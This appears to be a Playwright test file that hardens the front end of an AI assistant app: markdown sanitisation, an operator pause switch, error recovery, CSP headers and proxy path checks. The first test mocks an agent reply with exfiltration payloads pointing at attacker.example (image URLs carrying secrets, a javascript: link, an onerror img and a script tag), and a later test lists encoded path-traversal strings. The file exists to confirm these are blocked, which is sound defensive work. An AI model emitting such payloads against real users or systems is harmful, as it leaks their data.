// Front-end hardening: model text can't leak data through images or links (#69), the operator
// console's kill switch tells the truth when it fails (#72), a break-glass reason may use any
// characters (#73), a crash on one page leaves a way out (#71), and the security headers and the
// API proxy's path checks (#80).
import http from 'node:http'
import type { Page } from '@playwright/test'
import { expect, test } from '../src/fixtures'
import { ADMIN_TOKEN, BASE_URL } from '../src/env'
import { isPaused } from '../src/helpers/workspace'

const STAGE_HEADING = /Ava is at the Infant stage/

async function openConsole(page: Page): Promise<void> {
  await page.goto(`/console?token=${ADMIN_TOKEN}`)
  await expect(page.getByRole('heading', { level: 1, name: STAGE_HEADING })).toBeVisible()
}

// A raw GET with the path exactly as written: browsers and fetch tidy up `..` before sending.
function rawGet(path: string): Promise<{ status: number; body: string }> {
  const url = new URL(BASE_URL)
  return new Promise((resolve, reject) => {
    const req = http.request({ host: url.hostname, port: url.port, path, method: 'GET' }, (res) => {
      let body = ''
      res.on('data', (chunk) => (body += chunk))
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body }))
    })
    req.on('error', reject)
    req.end()
  })
}

test.describe('markdown from the model (#69)', () => {
  test('images are never loaded, links with script are dead, raw HTML stays text', async ({ page, owner }) => {
    void owner
    const attempted: string[] = []
    await page.route(/attacker\.example/, async (route) => {
      attempted.push(route.request().url())
      await route.abort('blockedbyclient')
    })
    const reply = [
      'Here is your summary.',
      '![](https://attacker.example/x?d=secret)',
      '![tracking pixel](https://attacker.example/y?d=secret2)',
      '[click me](javascript:window.__pwned=1)',
      '<img src="https://attacker.example/raw?d=secret3" onerror="window.__pwned=1">',
      '<script>window.__pwned=1</script>',
      '[a normal link](https://example.com/page)',
    ].join('\n\n')
    await page.route('**/api/app/messages', async (route) => {
      if (route.request().method() !== 'GET') return route.fallback()
      await route.fulfill({
        json: [{ id: 'm-evil', from: 'agent', text: reply, at: new Date().toISOString(), kind: 'chat' }],
      })
    })

    await page.goto('/dashboard/chat')
    await expect(page.getByText('Here is your summary.')).toBeVisible()
    await expect(page.getByRole('link', { name: 'a normal link' })).toHaveAttribute('href', 'https://example.com/page')
    // The picture's own description is shown as plain text instead.
    await expect(page.getByText('tracking pixel')).toBeVisible()
    await page.waitForTimeout(500) // give a stray image time to be requested

    expect(attempted).toEqual([])
    await expect(page.locator('img[src*="attacker"]')).toHaveCount(0)
    await expect(page.locator('main img, [aria-live] img')).toHaveCount(0)
    await expect(page.locator('a[href^="javascript:" i]')).toHaveCount(0)
    await expect(page.locator('script', { hasText: '__pwned' })).toHaveCount(0)
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined()
    // The raw HTML is shown as the text it is, not run.
    await expect(page.getByText('<script>window.__pwned=1</script>')).toBeVisible()
  })
})

test.describe('operator console', () => {
  test('if the pause switch fails the console says so, and the label still matches the server (#72)', async ({ page, owner }) => {
    void owner
    await openConsole(page)
    const errors: string[] = []
    page.on('pageerror', (e) => errors.push(e.message))
    await page.route('**/api/api/kill', (route) => route.fulfill({ status: 500, json: { detail: 'boom' } }))

    await page.getByRole('button', { name: 'Pause Ava' }).click()
    const alert = page.getByRole('alert').filter({ hasText: /pause/i })
    await expect(alert).toBeVisible()
    await expect(alert).toContainText('Nothing changed')
    await expect(page.getByRole('button', { name: 'Pause Ava' })).toBeEnabled()
    expect(await isPaused()).toBe(false)
    expect(errors).toEqual([])

    // When it works again, the message goes away and Ava is paused.
    await page.unroute('**/api/api/kill')
    await page.getByRole('button', { name: 'Pause Ava' }).click()
    await expect(page.getByRole('button', { name: 'Resume Ava' })).toBeVisible()
    await expect(page.getByRole('alert').filter({ hasText: /pause/i })).toHaveCount(0)
    expect(await isPaused()).toBe(true)
  })

  test('a break-glass reason with curly quotes and dashes opens the page and is recorded as written (#73)', async ({ page, api, owner }) => {
    const reason = 'The owner’s reminder never arrived — Priya Sharma, Delhi (क)'
    await openConsole(page)
    await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'People', exact: true }).click()
    await page.getByLabel(/^Reason/).fill(reason)
    await page.getByRole('button', { name: "Open, and record it in the owner's log" }).click()
    await expect(page.getByRole('heading', { level: 2, name: owner.name })).toBeVisible()
    await expect(page.getByText(/Can't reach Superaide/)).toHaveCount(0)

    const log = await api.ok<{ reason: string }[]>(api.get('/app/access-log'))
    expect(log.map((l) => l.reason)).toContain(reason)
  })
})

test.describe('a page that crashes (#71)', () => {
  test('the dashboard keeps its menu, explains in plain words, and Try again recovers', async ({ page, owner }) => {
    void owner
    await page.route('**/api/app/people*', async (route) => {
      await route.fulfill({
        json: { people: [{ id: 'p1', name: null, relationship: 'friend', channels: [], vip: false, notes: [] }] },
      })
    })
    await page.goto('/dashboard/people')
    await expect(page.getByRole('heading', { name: 'This page hit a problem' })).toBeVisible()
    await expect(page.getByText('Nothing you saved has been lost.')).toBeVisible()
    await expect(page.getByRole('button', { name: 'Try again' })).toBeVisible()
    await expect(page.getByRole('button', { name: 'Log out' })).toBeVisible()
    // The sidebar is still there, so the owner can go somewhere else.
    await expect(page.getByRole('link', { name: 'Settings' }).first()).toBeVisible()

    await page.unroute('**/api/app/people*')
    await page.getByRole('button', { name: 'Try again' }).click()
    await expect(page.getByRole('heading', { level: 1, name: 'People who matter' })).toBeVisible()
    await expect(page.getByRole('heading', { name: 'This page hit a problem' })).toHaveCount(0)
  })

  test('Log out on the error page ends the session', async ({ page, owner }) => {
    void owner
    await page.route('**/api/app/people*', (route) => route.fulfill({ json: { people: [{ id: 'p1', name: null, channels: [] }] } }))
    await page.goto('/dashboard/people')
    await page.getByRole('button', { name: 'Log out' }).click()
    await expect(page).toHaveURL(/\/login/)
  })
})

test.describe('security headers and the API proxy (#80)', () => {
  test('pages carry a Content-Security-Policy and HSTS', async ({ page, api }) => {
    void api
    for (const path of ['/', '/login', '/console']) {
      const res = await page.request.get(path)
      const csp = res.headers()['content-security-policy'] ?? ''
      expect(csp, path).toContain("img-src 'self' data:")
      expect(csp, path).toContain("frame-ancestors 'none'")
      expect(csp, path).toContain("object-src 'none'")
      expect(csp, path).toContain("base-uri 'self'")
      expect(csp, path).toContain("connect-src 'self'")
      expect(res.headers()['strict-transport-security'], path).toMatch(/max-age=\d{7,}/)
    }
  })

  test('the app still works under the policy: nothing is blocked on the main screens', async ({ page, owner }) => {
    void owner
    const blocked: string[] = []
    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) => {
        ;(window as unknown as { __csp: string[] }).__csp ??= []
        ;(window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`)
      })
    })
    page.on('console', (m) => {
      if (/Content Security Policy/i.test(m.text())) blocked.push(m.text())
    })
    for (const path of ['/dashboard', '/dashboard/chat', '/dashboard/notebook', '/dashboard/people', '/dashboard/settings', '/dashboard/connections']) {
      await page.goto(path)
      await expect(page.getByRole('main').or(page.locator('main')).first()).toBeVisible()
      await page.waitForTimeout(300)
      const seen = await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? [])
      expect(seen, path).toEqual([])
    }
    await page.goto(`/console?token=${ADMIN_TOKEN}`)
    await expect(page.getByRole('heading', { level: 1, name: STAGE_HEADING })).toBeVisible()
    expect(await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? [])).toEqual([])
    expect(blocked).toEqual([])
  })

  // Next tidies most of these away before the proxy sees them (so this passes without the proxy's own
  // check too); the check is a second lock, and this keeps the first one honest.
  test('dot and empty path segments never reach a route outside the allowed ones', async ({ api }) => {
    void api
    for (const path of [
      '/api/auth/%2e%2e/docs',
      '/api/auth/%2E%2E/%2E%2E/docs',
      '/api/auth/..%2fdocs',
    ]) {
      const r = await rawGet(path)
      expect(r.status, path).toBe(404)
      expect(r.body, path).not.toContain('Swagger')
    }
  })

  test('normal proxy calls still work, including the operator console prefix', async ({ page, api }) => {
    void api
    expect((await page.request.get('/api/health')).status()).toBe(200)
    expect((await page.request.get('/api/auth/me')).status()).toBe(401)
    expect((await page.request.get('/api/api/overview')).status()).toBe(401) // needs the admin token
    expect((await page.request.get('/api/docs')).status()).toBe(404) // not a public prefix
  })
})
